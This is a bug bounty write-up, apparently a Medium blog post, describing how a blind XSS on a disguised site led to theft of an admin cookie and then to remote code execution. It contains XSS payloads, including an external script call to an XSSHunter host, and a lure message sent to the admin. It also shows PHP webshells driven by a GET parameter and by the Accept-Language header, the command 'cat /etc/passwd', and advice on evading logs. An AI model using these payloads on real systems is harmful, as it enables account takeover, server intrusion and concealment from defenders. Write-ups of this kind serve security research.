# From Blind XSS to RCE

- **Source URL:** https://is4curity.medium.com/from-blind-xss-to-rce-when-headers-became-my-terminal-d137d2c808a3?source=rss------bug_bounty-5
- **Fetched from:** https://is4curity.medium.com/feed
- **Fetched:** 2026-11-16
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 10201)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello,

I’m **Mahmoud Elmanzalawy**, a bug bounty hunter who enjoys finding vulnerabilities in his free time. Today, I’ll walk you through how a simple **Blind XSS** led me all the way to **Remote Code Execution (RCE)** , and how HTTP headers became my terminal

During my testing on a website, let’s call it [https://reacted.com](https://reacted.com),

I explored various inputs, including those in profile settings. I injected XSS payloads into fields like username and bio, using a payload like this:

mahmoud'">\<script>alert(document.cookie)\</script>

I visited different parts of the website to check for any impact of the code :) , but nothing seemed to happen \*\_\*. At this point, I began to suspect that the code might not be effective here.

*(Most people would stop here, but not me.)*

However, I considered the possibility that it could work in the admin panel. So, I modified my payload to include my XSSHunter URL:

\<script src="//your\_xsshunter\_url\_here">\</script>

Now, I wanted to ensure that the admin would visit the user settings in the admin panel, potentially triggering my payload. To achieve this, I sent a message to the admin via the contact form, pretending to have issues with my account settings with account details.

After two days, I received a response. The admin had unwittingly executed my payload, leading to cookie theft and access to the admin panel.

i used the cookie > booooom im inside admin panel

Next, I wanted to identify exactly which input was vulnerable and where the payload had taken effect. So, I reverted my payload to the initial alert domain and visited the user settings in the admin panel. There, I discovered the vulnerable input. and i found

Now i have to move to next step try to get rce

I tried to upload php webshell but i found 500 response no thing is work

After some try

Finally, I attempted to execute remote code by uploading a PHP file containing

\<?php system($\_GET\['eg'\]); ?>

I tried accessing it via:

[https://reacted.com/admin/uploadfile/testing.php?eg=id](https://reacted.com/admin/uploadfile/testing.php?eg=id)

Unfortunately, I received a 500 Internal Server Error.

After some thought, I decided to try injecting the query into the header with this code

\<?php system($\_SERVER\['HTTP\_ACCEPT\_LANGUAGE'\]); ?>

Then I uploaded it and sent a request with a custom header:

Accept-Language: cat /etc/passwd

Guss what !!!!!!!! **IT WORKED!!** 🥳🔥

“This technique has a major advantage: it leaves no trace in traditional logs.

Since the command is passed through an HTTP header, most logging mechanisms won’t record it

making it stealthy and highly effective. 

keep you hidden on server”

Thank you for reading my write-up!

See you soon with another bugs 😄

Feel free to follow me on X: **@is4curity**

Happy bug hunting!

./Egypt 🇪🇬
